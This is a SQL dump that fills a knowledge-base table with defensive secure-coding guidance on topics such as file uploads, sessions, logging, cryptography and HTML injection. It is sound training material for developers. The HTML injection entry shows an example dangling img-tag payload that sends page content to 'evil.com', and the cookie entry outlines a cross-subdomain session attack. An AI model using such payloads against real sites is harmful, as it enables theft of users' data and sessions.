INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Character encodingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECharacter encoding is the process of mapping characters, numbers and other symbols to aNEWLINEstandard format. Typically, this is done to create a message ready for transmissionNEWLINEbetween sender and receiver. It is, in simple terms, the conversion of charactersNEWLINE(belonging to different languages like English, Chinese, Greek or any other known language)NEWLINEinto bytes. An example of a widely used character encoding scheme is the AmericanNEWLINEStandard Code for Information Interchange (ASCII) that initially used 7-bit codes.NEWLINEMore recent examples of encoding schemes would be the Unicode UTF-8 and UTF-16 computingNEWLINEindustry standards. In the space of application security and due to the plethora ofNEWLINEencoding schemes available, character encoding has a popular misuse. It is being used forNEWLINEencoding malicious injection strings in a way that obfuscates them. This can lead to theNEWLINEbypass of input validation filters, or take advantage of particular ways in which browsersNEWLINErender encoded text.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen trying to figure out the character encoding of a resource, user agents will try, inNEWLINEthis order:NEWLINENEWLINE* The HTTP Content-Type header sent by the serverNEWLINE* the XML declaration (only for XHTML documents)NEWLINE* HTML/XHTML meta element.NEWLINENEWLINEMake sure this information is provided by your application for the server in order toNEWLINEprevent it from guessing the wrong encoding standard, leaving room for injection.NEWLINENEWLINE## Note:NEWLINENEWLINEThese three ways of providing the character encoding of a document are notNEWLINEequivalent.NEWLINE', 'Character encoding'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP request methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP offers a number of methods that can be used to perform actions on the web server.NEWLINEMany of these methods are designed to aid developers in deploying and testingNEWLINEHTTP applications. These HTTP methods can be used for nefarious purposes if the webNEWLINEserver is misconfigured.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the application accepts only a defined set of HTTP request methods, such asNEWLINEGET and POST and unused methods are explicitly blocked/disabled.NEWLINE', 'HTTP request methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# File upload injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUploaded files represent a significant risk to applications.NEWLINEThe first step in many attacks is to get some code to the system to be attacked.NEWLINEThen the attack only needs to find a way to get the code executed. Using a file uploadNEWLINEhelps the attacker accomplish the first step.NEWLINENEWLINEThe consequences of unrestricted file upload can vary, including complete system takeover,NEWLINEan overloaded file system or database, forwarding attacks to back-end systems, and simpleNEWLINEdefacement.NEWLINENEWLINEThere are really two classes of problems here.NEWLINEThe first is with the file metadata, like the path and file name.NEWLINEThese are generally provided by the transport, such as HTTP multi-part encoding.NEWLINEThis data may trick the application into overwriting a critical file or storing the fileNEWLINEin a bad location. You must validate the metadata extremely carefully before using it.NEWLINENEWLINEThe other class of problem is with the file size or content.NEWLINEAn attacker can easily craft a valid image file with php code inside.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUploaded files always needs to be placed outside the document root of the web-server.NEWLINENEWLINEYou should also check the user-input(filename) for having the rightNEWLINEallowed extensions such as .jpg, .png etc.NEWLINENEWLINENote: when checking these extensions always make sure your application validates the lastNEWLINEpossible extension so an attacker could not simply inject ".jpg.php" and bypass yourNEWLINEvalidationNEWLINENEWLINEAfter this validation you must also check the user-input(filename) for containing possibleNEWLINEpath traversal patterns in order to prevent him from uploading outside ofNEWLINEthe intended directory.NEWLINENEWLINEMost developers also do a mime-type check. This is a good protection however notNEWLINEwhenever you are checking this mime-type through the post request. This header can not beNEWLINEtrusted since it can be easily manipulated by an attacker.NEWLINENEWLINEThe best way to check the mime-typeNEWLINEis to extract the file from the server after uploading and check it from the file itself.NEWLINEDeleting it whenever it does not comply with expected values.NEWLINENEWLINEYou may also want to check if the filenames do already exist before uploading in order toNEWLINEprevent the overwriting of files.NEWLINENEWLINEAlso for serving the files back there needs to be a file handler function that can selectNEWLINEthe file based on an identifier that will serve the file back towards the user.NEWLINE', 'File upload injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verbose version informationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINERevealing system data or debugging information helps an adversary learn about the systemNEWLINEand form a plan of attack. An information leak occurs when system data or debuggingNEWLINEinformation leaves the program through an output stream or logging function.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the HTTP headers do not expose detailed version information of systemNEWLINEcomponents. For each different type of server there are hardening guides dedicatedNEWLINEespecially for this type of data leaking.NEWLINE', 'Verbose version information'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP headers added by a front-endNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUse these kind of HTTP headers such as a bearer token only if you have authenticated the sever sendingNEWLINEthe header to your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that HTTP headers added by a trusted proxy or SSO devices, such as a bearer token, areNEWLINEauthenticated by the application.NEWLINE', 'HTTP headers added by a frontend'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session management controlNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe ability to restrict and maintain user actions within unique sessions is critical toNEWLINEweb security. Most users of this guide will be using an application framework with builtNEWLINEin session management capabilities. Others will use languages such as Perl CGI that do not.NEWLINEThose without a built in session management system and those who override the existingNEWLINEsession management systems are at an immediate disadvantage. Implementations built fromNEWLINEscratch are often weak and breakable. Developers are strongly discouraged fromNEWLINEimplementing their own Session Management.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways use the frameworks default session management control implementationNEWLINEin your application. If not possible you should find hardened guides in how to accomplishNEWLINEthis in a secure manner.NEWLINE', 'Session management control'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Available log analysis toolsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWith a log analysis tool in place you can easily and quickly do forensics as soon as youNEWLINEnotice your application is under attack by attackers and block them out.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEA list of recommended tools by OWASP you can find atNEWLINEhttps://www.owasp.org/index.php/Log_review_and_management#Logging_ToolsNEWLINE', 'Available log analysis tools'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Distinguish log-fields from trusted and untrusted sourcesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever log fields are distinguished from each other by means of logs from trusted andNEWLINEuntrusted log fields in your log entries your logs become clearer and more transparent.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that log fields from trusted and untrusted sources are distinguishable inNEWLINElog entries. If possible it is highly recommended that you separate these filesNEWLINEentirely from each other so the logs with untrusted user-input cannot corrupt theNEWLINEsystem generated logs.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Logging implemented on the server sideNEWLINE- Log injectionNEWLINE- The audit log must include a priority systemNEWLINE- User credentials in audit logsNEWLINE- Logging guidelinesNEWLINE', 'Distinguish log'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sanitize sensitive data rapidly from memoryNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive data is rapidly removed from the systems memory, this decreases theNEWLINEpossibility the attacker can compromise this data since it is removed as soon as it is noNEWLINElonger needed.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that sensitive data is rapidly sanitized from memory as soon as it is no longerNEWLINEneeded and handled in accordance to functions and techniques supported by theNEWLINEframework/library/operating system.NEWLINE', 'sanitise sensitive data rapidly from memory'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging is performed before executing the transactionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the logging is performed before executing a transaction you can be ensured thatNEWLINEthe transactions are logged. This increases the integrity of your log files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that logging is performed before executing the transaction. If logging wasNEWLINEunsuccessful (e.g. disk full, insufficient permissions) the application fails safe.NEWLINEThis is for when integrity and non-repudiation is a must.NEWLINE', 'logging is performed before executing the transaction'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verify integrity using checksumsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlways use checksums when working with interpreted code, libraries, executables,NEWLINEand configuration files, when these checksums do not match you can determine thatNEWLINEthese files are corrupted or backdoor-ed.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the integrity of interpreted code, libraries, executables, and configurationNEWLINEfiles is verified using checksums or hashes (not MD5).NEWLINE', 'Verify integrity using checksums'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Deny access from remote resources or systemsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEYou should always fend of remote connections with untrusted systems/resources which try toNEWLINEconnect to your application in order to prevent connecting to malicious systems that tryNEWLINEto attack your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESince this is very difficult to achieve on application level we recommend implementingNEWLINEEGRESS firewall rules.NEWLINE', 'Deny access from remote resources or systems'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Certificate paths/revocation informationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your certificate authority is not trusted anymore you should always be able toNEWLINErecall these certificates asap.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe trust anchor for given zone is found in the keyset-<zone name> file on the secureNEWLINEsigning computer in the same location where the signed and unsigned copies of the zone reside.NEWLINEThis file is created automatically as part of the signing process.NEWLINEA certificate revocation list (CRL) is a list, created and signed by aNEWLINEcertificate authority (CA), which contains serial numbers of certificates that have beenNEWLINEissued by that CA and are currently revoked. In addition to the serial number for theNEWLINErevoked certifications, the CRL also contains the reason for revocation for each certificateNEWLINEand the time the certificate was revoked. The serial number for each revoked certificate isNEWLINEkept in the CAs database and published in the CRL until the certificate expires.NEWLINENEWLINEAfter the revoked certificate is expired, the certificates entry in the CRL is removed andNEWLINEthe CA may remove the certificate from its database. Typically, the revoked certificateNEWLINEwill remain in the CRL for one publication period after the certificate expires. By allNEWLINEtimes you should have this information in reach in order to take quick actions.NEWLINE', 'Certificate paths revocation information'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Version managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a programmer decides to use third party software,NEWLINEhe should keep an eye implementing a proper version management methodology for this software.NEWLINEWhen hackers discover vulnerabilities they often publish these exploits online in orderNEWLINEto push the developers of this software to fix their issues. As a result,NEWLINEwhen your software is not upgraded to the latest available version,NEWLINEscript kiddies could easily compromise your application by following theNEWLINEexploit tutorials online, thus compromising your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOne option is not to use components that you did not write.NEWLINEBut that is not very realistic.NEWLINENEWLINEMost component projects do not create vulnerability patches for old versions.NEWLINEInstead, most simply fix the problem in the next version. So upgrading to these newNEWLINEversions is critical.NEWLINESoftware projects should have a process in place to:NEWLINENEWLINE-Identify all components and the versions you are using, including all dependencies.NEWLINE(e.g., the versions plugin).NEWLINENEWLINE-Monitor the security of these components in public databases,NEWLINEproject mailing lists, and security mailing lists, and keep them up to date.NEWLINENEWLINE-Establish security policies governing component use, such as requiring certain softwareNEWLINEdevelopment practices, passing security tests, and acceptable licenses.NEWLINENEWLINE-Where appropriate, consider adding security wrappers around components to disable unusedNEWLINEfunctionality and/ or secure weak or vulnerable aspects of the component.NEWLINENEWLINEThis also goes for all other components that should be up to date with proper securityNEWLINEconfiguration(s) and version(s) such as server OS etc.NEWLINENEWLINEThis should include removal of unneeded configurations and folders such as sampleNEWLINEapplications, platform documentation, and default or example users.NEWLINE', 'Version management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side Caching and HTML5 CachingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEDevelopers creating HTML5 applications can create fully offline-aware applications usingNEWLINEthe HTML5 ApplicationCache interface. The Application Cache uses a cache manifest file toNEWLINEspecify which files in an HTML5 application can be used offline, and which files require aNEWLINEnetwork connection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever store sensitive information in a client side cache since this can be easilyNEWLINEcompromised by attackers. The same principle does also apply to autocomplete functions.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Caching headersNEWLINE- Client side storageNEWLINE', 'HTML Caching'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic modules should operate in their approved mode according to their published security policiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever cryptographic modules do not operate in their approved mode according to theirNEWLINEpublished security policies these methods could become weak and become inadequate toNEWLINEensure strong cyphers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways verify that cryptographic modules operate in their approved mode according toNEWLINEtheir published security policies before implementing them into your application.NEWLINE', 'Cryptographic modules should operate in their approved mode according to their published security policies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sending data/parameters to untrusted devicesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application sends data/parameters to untrusted devices this data could beNEWLINEcompromised if the device has malicious intents.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application minimizes the number of parameters sent to untrusted systems,NEWLINEsuch as hidden fields, Ajax variables, cookies and header values.NEWLINENEWLINEThese untrusted devices should also be documented if possible and should be taken intoNEWLINEaccount when developing your application to minimize the possibility you sendNEWLINEunintended sensitive data towards these devices.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- High level architecture should be definedNEWLINE- Identify all application componentsNEWLINE', 'Sending data parameters to untrusted devices'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Process high value business logic flows in a trusted environmentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever high value business logic flows are processed in a trusted monitored environmentNEWLINEit reduces the movability of an attacker and chances of succeeding toNEWLINEperform successful attacks. If an attacker should breach your application his actionsNEWLINEcould be rapidly followed and counter measures could be taken.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application processes or verifies all high value business logic flows in aNEWLINEtrusted environment, such as on a protected and monitored server.NEWLINE', 'Proces high value business logic flows in a trusted environment'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Data from untrusted sourcesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever data from untrusted servers is executed by your application there is a highNEWLINEprobability this data could be contaminated with malicious code. Such as for exampleNEWLINEXSS from JSON files, or XXE when parsing XML files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application code does not execute uploaded data obtained from untrusted sources.NEWLINEYou could consider sandboxing this data when showing the content on your application.NEWLINENEWLINENOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended toNEWLINEalso encode or escape all data entering your application from third party sources.NEWLINE', 'Data from untrusted sources'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User restriction for sensitive dataNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlways enforce multiple layers of security whenever you want to protect sensitive data/filesNEWLINEon your application. If one layer should fail the other layers should prevent the attackersNEWLINEfrom succeeding.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever sensitive data is stored on the server you should consider storing this data inNEWLINEa separate folder with permission rules in order to prevent unauthorized users toNEWLINEread these files. As an in depth solution you could also check if the session of the userNEWLINEhas sufficient privileges to read the files according to the level of authorization.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Missing authentication or authorizationNEWLINE- Sanitize sensitive data rapidly from memoryNEWLINE', 'User restriction for sensitive data'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Runtime environmentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you use runtime environments you want to make sure these are not susceptible forNEWLINEbuffer overflows since this could lead to compromise of your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThere are a number of runtime solutions that can detect stack corruption and bufferNEWLINEoverruns or guard against attacks. These solutions typically terminate the programNEWLINEwhen an anomaly is detected, preventing the execution of arbitrary code.NEWLINE', 'Runtime environment'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Automatic variable bindingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the application framework allows automatic mass parameter assignmentNEWLINE(also called automatic variable binding) from the inbound request to a model,NEWLINEverify that security sensitive fields such as ''accountBalance'', ''role'' or ''password''NEWLINEare protected from malicious automatic binding. Whenever your application takes parametersNEWLINEin HTTPs GET statement and passes them as variables to code within the application thisNEWLINEcould become a safety hazard since the application processes these variablesNEWLINEin his operations.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen working with automatic variable binding you should create whitelists of whatNEWLINEparameters are expected and allow only these parameters to be passed into yourNEWLINEapplication operation.NEWLINE', 'Automatic variable binding'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic function implementationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever cryptographic function is not implemented on the server side then theseNEWLINEcryptographic functions could easily be bypassed by an attacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all cryptographic functions used to protect secrets from the applicationNEWLINEuser are implemented server side.NEWLINE', 'cryptographic function implementation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic modules must fail securelyNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a cryptographic module does not fail securely this the device needs to be put inNEWLINEerror state so it''s not useable anymore.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWe recommend using the NIST standard on testing the cryptographic module making it performNEWLINEthe self-tests to see if it fails securely.NEWLINE', 'cryptographic modules must fail securely'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verbose error messagingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn the development stage of an application programmers add debugging information on orderNEWLINEto debug certain functionalities. However, this stage often displays sensitive technicalNEWLINEinformation. If an attacker gains this technical information, he can learn more about theNEWLINEoperation of the application. The application should always display user-friendly messagesNEWLINEonly, when put on a live environment.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe level of debug information needs to be determined according to the environment whereNEWLINEthe code is running.NEWLINE', 'Verbose error messaging'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access to any master secret must be protected from unauthorized accessNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAccess to any master secret must be protected from unauthorized access in order to protectNEWLINEthe integrity and the confidentiality of the data.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever sensitive data is stored on the server you should consider storing this data in aNEWLINEseparate folder with permission rules in order to prevent unauthorizedNEWLINEusers to read these files. It is also highly recommended to encrypt/hash the password inNEWLINEorder to enforce higher security.NEWLINE', 'Access to any master secret must be protected from unauthorized access'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce policies for sensitive data processingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you process data you should always enforce policies for the transfer of sensitive dataNEWLINEin order to enforce higher level of security imposing structured thresholds toNEWLINEfend of attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFirst you have to create a list which contains locations of where all sensitive data isNEWLINEused and processed. Next, you create a policy that tells who is allowed and to what extendNEWLINEthey have privileges to look into which data. When this data moves through the network itNEWLINEshould always be encrypted (TLS) and also be stored encrypted. Thereafter you shouldNEWLINEestablish monitoring and testing methods to verify that everything stays encrypted andNEWLINEyour policy''s are properly enforced.NEWLINENEWLINEAlso, determine whenever data storage is necessary or becomes a redundancy.NEWLINEWhenever sensitive data does not have to be stored don''t store it. This reduces theNEWLINEquantity of data may your application ever be compromised.NEWLINENEWLINEUltimately, verify accessing sensitive data is logged, if the data is collected underNEWLINErelevant data protection directives or where logging of accesses is required.  NEWLINENEWLINESensitive data or primary keys, such as personally identifiable information or creditNEWLINEcards should also be anonymized, masked or truncated on the server before transmissionNEWLINEto the client.NEWLINE', 'Enforce policys for sensitive data processing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access-control/Login systems - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEFor successful access control/login functionality there are a lot of things to take intoNEWLINEconsideration before you start developing this type of functionality.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIt is highly recommended to study all the listed items and implement these principles inNEWLINEyour access control/login system in order to enforce a higher level of security.NEWLINENEWLINE1. Audit logsNEWLINE2. Principle of least privilege (Privilege based authentication system)NEWLINE3. Passwords must be encrypted, salted and stretchedNEWLINE4. Cross-Site Request Forgery (CSRF for authenticated forms)NEWLINE5. Session patternNEWLINE6. Session fixationNEWLINE7. Session hijackingNEWLINE8. Forget password functionsNEWLINE9. Client side authenticationNEWLINE10. Client side state managementNEWLINE11. cross sub domain cookie attackNEWLINE', 'Access control pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Password forget function - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are implementing a forgot password function into your system there areNEWLINEa few things you need to take into consideration in order to prevent security flawsNEWLINEin your application.NEWLINENEWLINE1. Forget password functionsNEWLINE2. Denial of service by locking out accountsNEWLINE3. Username enumerationNEWLINE4. Does The application enforce the use of secure passwordsNEWLINE5. Disallow the use of old passwordsNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe first thing is to verify that forgot password and other recovery pathsNEWLINEsend a link including a time-limited activation token rather than the password itself.NEWLINENEWLINEAdditional authentication based on soft-tokensNEWLINE(e.g. SMS token, native mobile applications, etc.) can be required as well beforeNEWLINEthe link is sent over.NEWLINENEWLINESecond, you should not lock out the users account whilst the process of getting a newNEWLINEpassword is in progress. This could lead to a Denial of service attack whenever anNEWLINEattacker decides to intentionally lock out the users with an automated attack.NEWLINENEWLINEThird, whenever the new password request was set in progress, the message you displayNEWLINEshould be generalized in order to prevent username enumeration.NEWLINENEWLINEFourth, always disallow the use of old passwords and implement a strong password policy.NEWLINE', 'Password forget pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sessions - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen working with sessions there are a couple of things you need to consider in orderNEWLINEto implement them securely throughout your system. For more detailed information aboutNEWLINEthese items you should check the knowledge-base about:NEWLINENEWLINE1.  Session management controlNEWLINE2.  Session cookies without the Secure flagNEWLINE3.  Session cookies without the HttpOnly flagNEWLINE4.  External session hijackingNEWLINE5.  Insecure transmission of session cookiesNEWLINE6.  Session information is not stored server sideNEWLINE7.  Session ids should be generated with sufficient entropy, preferred is the frameworks default session management control implementation is used by the applicationNEWLINE8.  User generated session ids should be rejected by the serverNEWLINE9.  The logout functionality should revoke the complete sessionNEWLINE10. The login functionality should always generate (and use) a new session idNEWLINE11. Session IDs do not timeout.(idl)NEWLINE12. Absolute session time outNEWLINE13. Verify that the session id is never disclosedNEWLINE14. Session cookies (Domain)NEWLINENEWLINE## Solution:NEWLINENEWLINEThe items as pointed out before should be looked into and taken into considerationNEWLINEwhenever you are working with sessions on your system in order to enforce aNEWLINEhigh level of security.NEWLINE', 'Sessions pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Submit forms - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user can submit a form in your system you should consider implementingNEWLINEthe following defense mechanism in order to ensure high level security.NEWLINENEWLINE1.  Single user input validation controls and Audit logsNEWLINE2.  CSRF tokensNEWLINE3.  Principle of least privilegeNEWLINE4.  GET/POST requestsNEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEHere are the steps described briefly.NEWLINEFor more detailed information you should look into these items in the knowledge base.NEWLINENEWLINEFirst, you should create a single user input validation control class which shouldNEWLINEvalidate the expected input values in order to verify if the user is not tampering dataNEWLINEor is injecting malicious code into your application. All infringements should be loggedNEWLINEand repercussions should be taken whenever these infringements are frequent.NEWLINENEWLINESecond, whenever an authenticated user is submitting the form always ensure the formsNEWLINEcontain CSRF tokens in order to prevent cross site request forgery.NEWLINENEWLINEThird, Whenever there are authenticated users with different roles/privileges you shouldNEWLINEenforce restrictions on the server side upon your form submits/processing in orderNEWLINEto prevent privilege escalation. You should apply the principle of least privilege inNEWLINEorder to ensure higher level of security.NEWLINENEWLINEFourth, Whenever the application is sending sensitive data through the form submitNEWLINEthis data must always be send through an POST variable instead of an GET sinceNEWLINEa GET will leak this data through the url by example the referrer header.NEWLINE', 'Submit forms pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Column truncation sql injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an applications structural logic mismatches with the database structural logicNEWLINEan attacker gains the opportunity to truncate his submit towards your database column byNEWLINEsubmitting a value longer then the limit allowed in the database.NEWLINENEWLINEImagine you have a system where users can register themselves.NEWLINENEWLINEThe attacker can abuse this behavior of the database to overflow the length limitNEWLINEand truncate his submit and register himself as the admin, thus gaining itsNEWLINEprivileges.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOn critical places where unique values are enforced and expectedNEWLINEsuch as usernames in order to authorize or distribute certain privileges. The users submitNEWLINEshould be checked on the server side in order to verify if it does not exceed the limitNEWLINEset in your database.NEWLINE', 'SQL injection Column truncation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User registration - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you allow users to register on your system there are a couple of things you needNEWLINEto take into consideration in order to enforce a high level of securityNEWLINEFor more detailed information about these items you should check the knowledge-base about:NEWLINENEWLINE1. Column truncation sql injection(for mysql databases)NEWLINE2. Single input validation controls  NEWLINE2. Audit logsNEWLINE3. Prevent password leakingNEWLINE4. Predictable password and or token generationNEWLINE5. Are all passwords hashed, salted and stretchedNEWLINE6. Does The application enforce the use of secure passwords.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe items as pointed out before should be looked into and taken into considerationNEWLINEwhenever you are letting users register on your system in order to enforce aNEWLINEhigh level of security.NEWLINENEWLINEHere are the steps described briefly.NEWLINEFor more detailed information you should look into these items in the knowledge base.NEWLINENEWLINEFirst, You enforce limits on the length of the users submits on the server side in orderNEWLINEto prevent him from truncating his submits. These limits have to correlate with the limitsNEWLINEyou set in your column in the database.NEWLINENEWLINESecond, you should create a single user input validation control class which shouldNEWLINEvalidate the expected input values in order to verify if the user is not tampering dataNEWLINEor injecting malicious code into your application. All infringements should be loggedNEWLINEand repercussions should be taken whenever these infringements are frequent.NEWLINENEWLINEThird, never display the users password on screen anywhere.NEWLINENEWLINEFourth, Whenever you generate a password for your users, this password should alwaysNEWLINEbe randomized sufficiently.NEWLINENEWLINEFifth, encrypt your passwords by proven cryptographic standards when storing them.NEWLINENEWLINESixth, Enforce secure passwords by implementing good password policies.NEWLINE', 'User registration pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cross subdomain cookie attacksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA quick overview of how it works:NEWLINENEWLINE1. A web site www.example.com hands out subdomains to untrusted third partiesNEWLINE2. One such party, Mallory, who now controls evil.example.com, lures Alice to her siteNEWLINE3. A visit to evil.example.com sets a session cookie with the domain .example.com on Alice''s browserNEWLINE4. When Alice visits www.example.com, this cookie will be sent with the request, as the specs for cookies states, and Alice will have the session specified by Mallory''s cookie.NEWLINE5. Mallory can now use Alice her account.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn this scenario changing the sessionID on login does not make any difference sinceNEWLINEAlice is already logged in when she visits Mallory''s evil webpage.NEWLINENEWLINEIt is good practice to use a completely different domain for all trusted activity.NEWLINENEWLINEFor example Google uses google.com for trusted activities and *.googleusercontent.comNEWLINEfor untrusted sites.NEWLINENEWLINEAlso when setting your cookies to specify which domains they are allowed toNEWLINEbe send to. Especially on your trusted domain you do not want to leak cookies to unintendedNEWLINEsubdomains. highly recommended is to not use wildcards when setting this option.NEWLINE', 'cross subdomain cookie attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTML injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an attacker can inject HTML in your application there is a variety of differentNEWLINEattacks he could perform such as:NEWLINENEWLINE1. Content SpoofingNEWLINE2. Image Tag Injection 	NEWLINE3. Form ReroutingNEWLINE4. Base JumpingNEWLINE5. Element OverrideNEWLINE6. Hanging TextareaNEWLINENEWLINEEven when your application intercepts XSS injections by means of a content security policyNEWLINEheader it still remains vulnerable to the attacks summarized above.NEWLINENEWLINE## Solution:NEWLINENEWLINE1.Content spoofing Otherwise known as "Content Injection" or "Virtual Defacement" occursNEWLINEwhenever an attacker can inject code into your application. It is very important to sanitize andNEWLINEor encode user data before you display it on screen as HTML.NEWLINENEWLINE2.Image tag injection occurs whenever an attacker injects a broken image tag with a non terminatedNEWLINEparameter like : "img src=''http://evil.com?steal.php?value=NEWLINEEvery content after value= parameter will now be stolen and send to evil.com by the attackerNEWLINEtill the injection finds the next occurrence of a matching single quote.NEWLINENEWLINEAgain you should sanitize and encode the user-input to prevent an image tag from being injectedNEWLINEin your application. For whenever a user is permitted to submit an image on your applicationNEWLINEenforce and verify the application accepts valid non-broken tags only.NEWLINENEWLINE3.The "form" tag can''t be nested. The top-level occurrence of this elementNEWLINEalways takes precedence over subsequent appearances. Again you must avoid this type byNEWLINEproperly encoding and sanitizing your user-inputs.NEWLINENEWLINE4.Whenever an attacker injects a "base" tag into your application it can steal data becauseNEWLINEthe <base> tag specifies the base URL/target to where to process his data to.NEWLINENEWLINEThe solution to base jumping would be to us absolute paths in your application such as:NEWLINEaction=''/update_profile.php''NEWLINENEWLINEinstead of:NEWLINEaction=''update_profile.php''NEWLINENEWLINE5/6 can both also easily be prevented simply be encoding or 